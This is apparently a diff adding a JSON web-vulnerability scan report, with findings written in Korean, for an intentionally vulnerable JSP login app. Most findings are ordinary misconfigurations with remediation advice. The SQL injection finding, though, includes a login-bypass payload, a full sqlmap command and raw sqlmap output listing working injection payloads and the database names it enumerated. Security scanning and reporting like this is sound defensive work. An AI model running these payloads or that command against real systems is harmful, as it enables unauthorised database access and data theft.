@@ -1,0 +1,109 @@
+{
+  "scan_id": "SCAN-20260515-075403",
+  "target": "http://15.164.60.79",
+  "scanner": "signature-based",
+  "generated_at": "2026-05-15T16:54:03+09:00",
+  "summary": {
+    "total": 7,
+    "severity": {
+      "critical": 0,
+      "high": 1,
+      "medium": 4,
+      "low": 2
+    }
+  },
+  "results": [
+    {
+      "id": "RES-0001",
+      "check_id": "WEB-A02-001",
+      "owasp": "A02:2025 Security Misconfiguration",
+      "name": "보안 헤더 미설정",
+      "url": "",
+      "severity": "low",
+      "evidence": "CSP unsafe-inline 허용",
+      "recommendation": "필수 보안 헤더 적용 및 CSP nonce/hash 기반 설정"
+    },
+    {
+      "id": "RES-0002",
+      "check_id": "WEB-A02-002",
+      "owasp": "A02:2025 Security Misconfiguration",
+      "name": "서버 버전 노출",
+      "url": "",
+      "severity": "low",
+      "evidence": "headers={'Server': 'nginx/1.28.3 (Ubuntu)'}, body_keywords=['Apache Tomcat/']",
+      "recommendation": "서버 배너 제거 및 커스텀 에러 페이지 적용"
+    },
+    {
+      "id": "RES-0003",
+      "check_id": "WEB-A04-001",
+      "owasp": "A04:2025 Cryptographic Failures",
+      "name": "HTTPS 미적용",
+      "url": "",
+      "severity": "medium",
+      "evidence": "HTTP 프로토콜 사용",
+      "recommendation": "HTTPS 적용 및 HTTP to HTTPS 리다이렉트 설정"
+    },
+    {
+      "id": "RES-0004",
+      "check_id": "WEB-A05-001",
+      "owasp": "A05:2025 Injection",
+      "name": "SQL Injection",
+      "url": "",
+      "severity": "high",
+      "evidence": {
+        "payload": "' OR '1'='1",
+        "error_based": false,
+        "auth_bypass": true,
+        "redirected": true,
+        "redirect_location": "http://15.164.60.79/vulnapp/admin.jsp",
+        "login_failed_absent": true,
+        "time_based": false,
+        "delay": 0.01,
+        "sqlmap": {
+          "command": "sqlmap -u http://15.164.60.79/vulnapp/login.jsp --batch --level 2 --risk 1 --banner --current-user --current-db --is-dba --dbs --data id=test&pw=test",
+          "returncode": 0,
+          "dbms_banner": "11.8.6-MariaDB-5 from Ubuntu",
+          "current_user": "vulnuser@localhost",
+          "current_db": "vuln_db",
+          "is_dba": false,
+          "databases": [
+            "information_schema",
+            "vuln_db"
+          ],
+          "raw_tail": ") with a total of 51 HTTP(s) requests:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 4541=(SELECT (CASE WHEN (4541=4541) THEN 4541 ELSE (SELECT 1910 UNION SELECT 8777) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(8209,CONCAT(0x5c,0x717a716271,(SELECT (ELT(8209=8209,1))),0x71626a7671)) AND 'fANK'='fANK&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 3800 FROM (SELECT(SLEEP(5)))nQNe) AND 'mftD'='mftD&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a716271,0x6b4d764a697847586758446273496b5652434c4c63506877447473686f624b4b4c65456841494656,0x71626a7671),NULL,NULL-- -&pw=test\n---\ndo you want to exploit this SQL injection? [Y/n] Y\n[07:54:02] [INFO] the back-end DBMS is MySQL\n[07:54:02] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: Django, Nginx 1.28.3, JSP\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[07:54:02] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[07:54:02] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[07:54:02] [INFO] testing if current user is DBA\n[07:54:02] [INFO] fetching current user\n[07:54:02] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[07:54:02] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[07:54:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-05152026_0753am.csv'\n\n[*] ending @ 07:54:02 /2026-05-15/\n\n\n"
+        }
+      },
+      "recommendation": "Prepared Statement 사용 및 입력값 검증"
+    },
+    {
+      "id": "RES-0005",
+      "check_id": "WEB-A06-001",
+      "owasp": "A06:2025 Insecure Design",
+      "name": "로그인 Rate Limit 미구현",
+      "url": "",
+      "severity": "medium",
+      "evidence": "반복 로그인 실패 요청이 차단되지 않음",
+      "recommendation": "로그인 실패 횟수 제한 및 지연 응답 적용"
+    },
+    {
+      "id": "RES-0006",
+      "check_id": "WEB-A06-002",
+      "owasp": "A06:2025 Insecure Design",
+      "name": "debug=true 기능 활성화",
+      "url": "",
+      "severity": "medium",
+      "evidence": "debug=true 요청 시 내부 설정 또는 디버그 정보 노출",
+      "recommendation": "운영 환경에서 debug 기능 비활성화"
+    },
+    {
+      "id": "RES-0007",
+      "check_id": "WEB-A07-001",
+      "owasp": "A07:2025 Authentication Failures",
+      "name": "계정 잠금 미구현",
+      "url": "",
+      "severity": "medium",
+      "evidence": "10회 이상 로그인 실패 후에도 계정 잠금 또는 차단 응답 없음",
+      "recommendation": "계정 잠금, 지연 응답, CAPTCHA 적용"
+    }
+  ]
+}
